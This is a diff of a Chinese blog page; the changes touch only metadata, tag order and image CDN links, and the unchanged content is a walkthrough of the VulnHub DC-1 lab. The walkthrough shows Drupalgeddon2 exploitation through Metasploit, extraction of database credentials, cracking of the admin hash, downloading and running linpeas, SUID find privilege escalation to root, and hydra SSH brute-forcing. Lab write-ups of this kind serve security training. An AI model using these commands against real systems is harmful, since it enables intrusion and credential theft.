@@ -51,24 +51,24 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-03-10T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-01T02:37:23.310Z">
+<meta property="article:modified_time" content="2026-05-14T10:04:40.417Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="靶机渗透">
 <meta property="article:tag" content="VulnHub">
 <meta property="article:tag" content="vulnhub-DC">
-<meta property="article:tag" content="提权">
 <meta property="article:tag" content="Drupal">
+<meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
   
   
   
-  <meta name="keywords" content="靶机渗透,VulnHub,vulnhub-DC,提权,Drupal">
+  <meta name="keywords" content="靶机渗透,VulnHub,vulnhub-DC,Drupal,提权">
 
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp2fxa5k">
+  <link rel="stylesheet" href="/css/main.css?v=mp5bt8nf">
 
 
   
@@ -77,7 +77,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-10T12:00:00+08:00","dateModified":"2026-05-01T10:37:23+08:00","datePublished":"2026-03-10T12:00:00+08:00","description":"","headline":"VulnHub DC-1 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a423f6db/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a423f6db/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权, Drupal","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-10T12:00:00+08:00","dateModified":"2026-05-14T18:04:40+08:00","datePublished":"2026-03-10T12:00:00+08:00","description":"","headline":"VulnHub DC-1 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a423f6db/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a423f6db/","keywords":"靶机渗透, VulnHub, vulnhub-DC, Drupal, 提权","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -133,15 +133,15 @@
 <h2 id="🔍-一、信息收集"><a href="#🔍-一、信息收集" class="headerlink" title="🔍 一、信息收集"></a>🔍 一、信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><p>先查看一下本地网段，确认在 67 网段，使用 nmap 扫描存活主机：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.67.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image1.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image1.png"></p>
 <p>扫描结果中发现目标 IP 为 <code>192.168.67.131</code>。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image2.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image2.png"></p>
 <h3 id="1-2-端口与服务扫描"><a href="#1-2-端口与服务扫描" class="headerlink" title="1.2 端口与服务扫描"></a>1.2 端口与服务扫描</h3><p>对目标 IP 进行详细扫描，获取开放端口、服务版本及系统信息：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.67.131</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-generator: Drupal 7</span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC #100000)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image3.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image3.png"></p>
 <p><strong>扫描结果分析：</strong></p>
 <table>
 <thead>
@@ -174,7 +174,7 @@
 <h2 id="💥-二、漏洞利用"><a href="#💥-二、漏洞利用" class="headerlink" title="💥 二、漏洞利用"></a>💥 二、漏洞利用</h2><h3 id="2-1-搜索-Drupal-漏洞"><a href="#2-1-搜索-Drupal-漏洞" class="headerlink" title="2.1 搜索 Drupal 漏洞"></a>2.1 搜索 Drupal 漏洞</h3><p>使用 <code>searchsploit</code> 在本地漏洞库中搜索 Drupal 7 相关漏洞：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal 7</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image4.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image4.png"></p>
 <p>发现 <strong>Drupalgeddon2（CVE-2018-7600）</strong> 漏洞，该漏洞允许未授权远程代码执行（RCE），危害极高。</p>
 <h3 id="2-2-使用-Metasploit-利用漏洞"><a href="#2-2-使用-Metasploit-利用漏洞" class="headerlink" title="2.2 使用 Metasploit 利用漏洞"></a>2.2 使用 Metasploit 利用漏洞</h3><p>启动 Metasploit 框架：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
@@ -182,32 +182,32 @@
 <p>搜索并加载 Drupalgeddon2 模块：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search Drupalgeddon</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image5.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image5.png"></p>
 <p>查看模块参数配置（<code>Required: yes</code> 为必填项）：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image6.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image6.png"></p>
 <p>配置目标和本机 IP：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.67.131</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.67.128</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image7.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image7.png"></p>
 <p>执行攻击：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <p>成功获取 Meterpreter shell，进入交互式终端：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image9.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image9.png"></p>
 <p>查看当前权限：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span>   <span class="comment"># www-data</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">uname</span> -a <span class="comment"># Linux DC-1 3.2.0-6-486</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image8.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image8.png"></p>
 <blockquote>
 <p>⚠️ 当前为 <strong>www-data</strong> 权限，需要进一步提权。</p>
 </blockquote>
 <hr>
 <h2 id="🚩-三、寻找-Flag"><a href="#🚩-三、寻找-Flag" class="headerlink" title="🚩 三、寻找 Flag"></a>🚩 三、寻找 Flag</h2><h3 id="3-1-Flag-1"><a href="#3-1-Flag-1" class="headerlink" title="3.1 Flag 1"></a>3.1 Flag 1</h3><p>查看当前目录文件，发现 <code>flag1.txt</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image10.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image10.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Every good CMS needs a config file - and so do you.</span><br></pre></td></tr></table></figure>
 
 <blockquote>
@@ -216,38 +216,38 @@
 <h3 id="3-2-Flag-2-——-数据库配置文件"><a href="#3-2-Flag-2-——-数据库配置文件" class="headerlink" title="3.2 Flag 2 —— 数据库配置文件"></a>3.2 Flag 2 —— 数据库配置文件</h3><p>Drupal 的配置文件路径为：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/drupal/sites/default/settings.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image11.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image12.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image11.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image12.png"></p>
 <p>在配置文件中发现 <strong>MySQL 数据库账号密码</strong> 以及 <strong>Flag 2</strong>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image13.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image13.png"></p>
 <blockquote>
 <p>数据库凭据：<code>dbuser / R0ck3t</code></p>
 </blockquote>
 <p>尝试用 Navicat 外连失败（目标不允许外部连接）：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image14.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image14.png"></p>
 <p>改为在 shell 中本地连接 MySQL：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image15.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image15.png"></p>
 <p>查看数据库，进入 <code>drupaldb</code>：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image16.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image17.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image16.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image17.png"></p>
 <p>查看 users 表结构：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc <span class="built_in">users</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image18.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image18.png"></p>
 <p>提取用户名和密码 hash：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name,pass from <span class="built_in">users</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image19.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image19.png"></p>
 <h3 id="3-3-破解管理员密码"><a href="#3-3-破解管理员密码" class="headerlink" title="3.3 破解管理员密码"></a>3.3 破解管理员密码</h3><p>密码为 Drupal 使用的 PHPass 加密格式（<code>$S$</code> 开头），使用在线工具破解：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.cmd5.com/">cmd5.com</a>（需付费）</li>
 <li><a target="_blank" rel="noopener" href="https://hashes.com/zh/decrypt/hash">hashes.com</a>（免费）</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image20.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image20.png"></p>
 <p>破解结果：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR : 53cr3t</span><br></pre></td></tr></table></figure>
 
@@ -255,19 +255,19 @@
 <p>🔑 管理员账号：<code>admin / 53cr3t</code></p>
 </blockquote>
 <h3 id="3-4-Flag-3-——-Drupal-后台"><a href="#3-4-Flag-3-——-Drupal-后台" class="headerlink" title="3.4 Flag 3 —— Drupal 后台"></a>3.4 Flag 3 —— Drupal 后台</h3><p>使用破解的账号登录 Drupal 后台：<code>http://192.168.67.131/user/login</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image21.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image21.png"></p>
 <p>在后台内容中发现 <strong>Flag 3</strong>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image22.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image23.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image22.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image23.png"></p>
 <blockquote>
 <p>💡 提示：去找 <code>/etc/passwd</code> 文件。</p>
 </blockquote>
 <h3 id="3-5-Flag-4-——-系统用户信息"><a href="#3-5-Flag-4-——-系统用户信息" class="headerlink" title="3.5 Flag 4 —— 系统用户信息"></a>3.5 Flag 4 —— 系统用户信息</h3><p>在 MSF shell 中查看 <code>/etc/passwd</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image24.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image24.png"></p>
 <p>发现系统存在 <code>flag4</code> 用户：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image25.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image25.png"></p>
 <p>进入 <code>/home/flag4</code> 目录，查看 flag4 内容：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag4.txt</span><br></pre></td></tr></table></figure>
 
@@ -276,16 +276,16 @@
 <blockquote>
 <p>💡 提示：在 root 目录中还有最终 flag，需要提权。</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image26.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image26.png"></p>
 <hr>
 <h2 id="⬆️-四、权限提升"><a href="#⬆️-四、权限提升" class="headerlink" title="⬆️ 四、权限提升"></a>⬆️ 四、权限提升</h2><h3 id="4-1-信息收集"><a href="#4-1-信息收集" class="headerlink" title="4.1 信息收集"></a>4.1 信息收集</h3><p>笔记里的提权方式有很多</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image27.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image27.png"></p>
 <p>查看内核版本：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image28.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image28.png"></p>
 <p>尝试使用 MSF 自动检测提权方案：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image29.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image29.png"></p>
 <blockquote>
 <p>未找到可用的提权建议，换手动方式。</p>
 </blockquote>
@@ -293,30 +293,30 @@
 <p>在 Kali 上开启 HTTP 服务：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image30.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image30.png"></p>
 <p>在靶机 shell 中下载 linpeas.sh：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.67.128:8888/linpeas.sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image31.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image32.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image31.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image32.png"></p>
 <p>确认下载成功后执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image33.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image33.png"></p>
 <p>LinPEAS 输出结果中发现 <code>find</code> 命令具有 <strong>SUID</strong> 权限：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image34.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image35.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image36.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image34.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image35.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image36.png"></p>
 <h3 id="4-3-SUID-提权（find-命令）"><a href="#4-3-SUID-提权（find-命令）" class="headerlink" title="4.3 SUID 提权（find 命令）"></a>4.3 SUID 提权（find 命令）</h3><p>访问 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a> 查询 find 的 SUID 利用方式：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image37.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image38.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image37.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image38.png"></p>
 <p>执行提权命令（注意需要使用 <code>-p</code> 参数保留 SUID 权限）：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/bash -p \; -quit</span><br></pre></td></tr></table></figure>
 
 <p>成功获取 <strong>root</strong> 权限，找到最终 flag：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image39.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image39.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Well done!!!!</span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>
 
 <hr>
@@ -324,11 +324,11 @@
 <p>使用 hydra 爆破 SSH（用的是john的字典）：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.67.131</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image40.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image40.png"></p>
 <p>成功获取密码：<code>flag4 / orange</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.67.131</span><br><span class="line"><span class="comment"># 密码：orange</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-1_image41.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-1_image41.png"></p>
 <blockquote>
 <p>💡 登录 flag4 后同样可以利用 SUID find 或内核漏洞提权至 root。</p>
 </blockquote>
@@ -830,7 +830,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp2fxa5m" defer></script>
+<script src="/js/main.js?v=mp5bt8nh" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1094,7 +1094,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp2fxa5n"></script>
+<script src="/js/plugins/achievements.js?v=mp5bt8ni"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
